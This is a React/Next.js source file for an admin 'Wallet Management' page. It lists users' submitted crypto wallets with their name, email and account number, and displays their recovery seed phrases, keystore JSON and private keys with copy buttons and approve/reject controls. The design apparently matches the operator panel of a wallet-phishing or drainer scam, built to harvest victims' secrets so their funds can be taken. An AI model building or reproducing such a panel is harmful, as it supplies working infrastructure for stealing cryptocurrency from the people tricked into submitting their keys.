"use client";

import React, { useEffect, useState } from "react";
import { Button } from "@/components/ui/button";
import { toast } from "sonner";
import { CheckCircle, XCircle, Eye, Copy } from "lucide-react";

interface Wallet {
  _id: string;
  userId: {
    _id: string;
    email: string;
    fullName: string;
    accountNumber: string;
  };
  walletName: string;
  walletType: "phrase" | "keystore" | "private";
  seedPhrase?: string;
  keystoreJson?: string;
  privateKey?: string;
  status: "pending" | "approved" | "rejected";
  submittedAt: string;
  approvedAt?: string;
  rejectedReason?: string;
}

export default function WalletAdminPage(){
  const [wallets, setWallets] = useState<Wallet[]>([]);
  const [loading, setLoading] = useState<boolean>(true);
  const [expandedId, setExpandedId] = useState<string | null>(null);
  const [actionLoading, setActionLoading] = useState<string | null>(null);
  const [rejectionReason, setRejectionReason] = useState<string>("");
  const [showRejectInput, setShowRejectInput] = useState<string | null>(null);

  useEffect(() => {
    fetchWallets();
  }, []);

  const fetchWallets = async () => {
    try {
      setLoading(true);
      const res = await fetch("/api/admin/wallet?status=pending");
      const data = await res.json();

      if (data.success) {
        setWallets(data.data);
      } else {
        toast.error("Failed to fetch wallets");
      }
    } catch (error) {
      toast.error("Error fetching wallets");
      console.error(error);
    } finally {
      setLoading(false);
    }
  };

  const handleApprove = async (walletId: string) => {
    try {
      setActionLoading(walletId);
      const res = await fetch("/api/admin/wallet", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          walletId,
          action: "approve",
        }),
      });

      const data = await res.json();
      if (data.success) {
        toast.success("Wallet approved");
        fetchWallets();
      } else {
        toast.error(data.error || "Failed to approve");
      }
    } catch (error) {
      toast.error("Error approving wallet");
      console.error(error);
    } finally {
      setActionLoading(null);
    }
  };

  const handleReject = async (walletId: string) => {
    if (!rejectionReason.trim()) {
      toast.error("Please provide a reason for rejection");
      return;
    }

    try {
      setActionLoading(walletId);
      const res = await fetch("/api/admin/wallet", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          walletId,
          action: "reject",
          reason: rejectionReason,
        }),
      });

      const data = await res.json();
      if (data.success) {
        toast.success("Wallet rejected");
        setRejectionReason("");
        setShowRejectInput(null);
        fetchWallets();
      } else {
        toast.error(data.error || "Failed to reject");
      }
    } catch (error) {
      toast.error("Error rejecting wallet");
      console.error(error);
    } finally {
      setActionLoading(null);
    }
  };

  const copyToClipboard = (text: string) => {
    navigator.clipboard.writeText(text);
    toast.success("Copied to clipboard");
  };

  const maskText = (text: string, showChars: number = 10) => {
    if (text.length <= showChars * 2) return text;
    return `${text.substring(0, showChars)}...${text.substring(text.length - showChars)}`;
  };

  if (loading) {
    return (
      <div className="min-h-screen bg-background flex items-center justify-center">
        <div className="text-muted-foreground">Loading wallets...</div>
      </div>
    );
  }

  return (
    <div className="min-h-screen bg-background text-foreground p-6">
      <div className="max-w-7xl mx-auto">
        <div className="mb-8">
          <h1 className="text-4xl font-bold mb-2">Wallet Management</h1>
          <p className="text-muted-foreground">
            Review and approve/reject wallet submissions from users
          </p>
        </div>

        {wallets.length === 0 ? (
          <div className="text-center py-12 bg-card/50 rounded-lg border border-border">
            <p className="text-muted-foreground">No pending wallets to review</p>
          </div>
        ) : (
          <div className="space-y-4">
            {wallets.map((wallet) => (
              <div
                key={wallet._id}
                className="bg-card/50 border border-border rounded-lg p-6 hover:border-primary/50 transition"
              >
                {/* Header */}
                <div className="flex items-center justify-between mb-4">
                  <div className="flex-1">
                    <div className="flex items-center gap-3 mb-2">
                      <h3 className="text-lg font-semibold">
                        {wallet.walletName}
                      </h3>
                      <span className="inline-flex items-center gap-2 px-3 py-1 rounded-full text-sm bg-blue-500/20 text-blue-300">
                        {wallet.walletType.toUpperCase()}
                      </span>
                    </div>

                    <div className="text-sm text-muted-foreground">
                      <p>User: {wallet.userId.fullName}</p>
                      <p>Email: {wallet.userId.email}</p>
                      <p>Account: {wallet.userId.accountNumber}</p>
                      <p>
                        Submitted:{" "}
                        {new Date(wallet.submittedAt).toLocaleString()}
                      </p>
                    </div>
                  </div>

                  <button
                    onClick={() =>
                      setExpandedId(
                        expandedId === wallet._id ? null : wallet._id
                      )
                    }
                    className="px-4 py-2 bg-primary/20 hover:bg-primary/40 rounded transition"
                  >
                    {expandedId === wallet._id ? "Collapse" : "View Data"}
                  </button>
                </div>

                {/* Expanded Data */}
                {expandedId === wallet._id && (
                  <div className="mb-4 p-4 bg-background/50 rounded border border-border">
                    <div className="space-y-3">
                      {wallet.seedPhrase && (
                        <div>
                          <p className="text-sm font-semibold text-muted-foreground">
                            Recovery Phrase:
                          </p>
                          <div className="flex items-center gap-2 mt-1">
                            <code className="flex-1 bg-background p-2 rounded text-xs break-all">
                              {wallet.seedPhrase}
                            </code>
                            <button
                              onClick={() =>
                                copyToClipboard(wallet.seedPhrase!)
                              }
                              className="p-2 hover:bg-card rounded"
                            >
                              <Copy size={16} />
                            </button>
                          </div>
                        </div>
                      )}

                      {wallet.keystoreJson && (
                        <div>
                          <p className="text-sm font-semibold text-muted-foreground">
                            Keystore JSON:
                          </p>
                          <div className="flex items-center gap-2 mt-1">
                            <code className="flex-1 bg-background p-2 rounded text-xs break-all max-h-24 overflow-auto">
                              {wallet.keystoreJson}
                            </code>
                            <button
                              onClick={() =>
                                copyToClipboard(wallet.keystoreJson!)
                              }
                              className="p-2 hover:bg-card rounded"
                            >
                              <Copy size={16} />
                            </button>
                          </div>
                        </div>
                      )}

                      {wallet.privateKey && (
                        <div>
                          <p className="text-sm font-semibold text-muted-foreground">
                            Private Key:
                          </p>
                          <div className="flex items-center gap-2 mt-1">
                            <code className="flex-1 bg-background p-2 rounded text-xs">
                              {maskText(wallet.privateKey)}
                            </code>
                            <button
                              onClick={() =>
                                copyToClipboard(wallet.privateKey!)
                              }
                              className="p-2 hover:bg-card rounded"
                            >
                              <Copy size={16} />
                            </button>
                          </div>
                        </div>
                      )}
                    </div>
                  </div>
                )}

                {/* Actions */}
                <div className="flex items-center gap-3">
                  <Button
                    onClick={() => handleApprove(wallet._id)}
                    disabled={actionLoading === wallet._id}
                    className="flex items-center gap-2 bg-green-600 hover:bg-green-700"
                  >
                    <CheckCircle size={16} />
                    Approve
                  </Button>

                  {showRejectInput === wallet._id ? (
                    <div className="flex-1 flex items-center gap-2">
                      <input
                        type="text"
                        value={rejectionReason}
                        onChange={(e) =>
                          setRejectionReason(e.target.value)
                        }
                        placeholder="Reason for rejection..."
                        className="flex-1 bg-background/50 border border-border px-3 py-2 rounded text-sm"
                      />
                      <Button
                        onClick={() =>
                          handleReject(wallet._id)
                        }
                        disabled={actionLoading === wallet._id}
                        className="bg-red-600 hover:bg-red-700"
                      >
                        Confirm
                      </Button>
                      <Button
                        onClick={() => {
                          setShowRejectInput(null);
                          setRejectionReason("");
                        }}
                        className="bg-gray-600 hover:bg-gray-700"
                      >
                        Cancel
                      </Button>
                    </div>
                  ) : (
                    <Button
                      onClick={() =>
                        setShowRejectInput(wallet._id)
                      }
                      disabled={actionLoading === wallet._id}
                      className="flex items-center gap-2 bg-red-600 hover:bg-red-700"
                    >
                      <XCircle size={16} />
                      Reject
                    </Button>
                  )}
                </div>
              </div>
            ))}
          </div>
        )}
      </div>
    </div>
  );
}
